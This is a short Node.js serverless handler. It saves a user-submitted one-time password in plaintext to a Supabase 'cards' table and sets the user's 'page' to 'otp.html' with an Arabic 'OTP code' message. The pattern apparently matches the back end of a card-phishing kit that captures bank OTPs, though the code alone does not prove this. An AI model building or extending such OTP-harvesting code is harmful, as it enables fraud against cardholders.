const { supabase, getUserFromReq, parseBody } = require('../lib/supabase');

module.exports = async (req, res) => {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const user = getUserFromReq(req);
  if (!user) return res.status(401).json({ error: 'Unauthorized' });

  const body = await parseBody(req);
  const otp = body.otp || '';
  const userId = user.userId;

  const { data: cards } = await supabase
    .from('cards')
    .select('*')
    .eq('user_id', userId)
    .order('created_at', { ascending: false })
    .limit(1);

  if (cards && cards.length > 0) {
    await supabase.from('cards').update({ otp }).eq('id', cards[0].id);
  } else {
    await supabase.from('cards').insert({ user_id: userId, otp });
  }

  await supabase.from('users').update({
    message: 'رمز OTP',
    page: 'otp.html',
    updated_at: new Date().toISOString()
  }).eq('id', userId);

  res.json({ success: true });
};
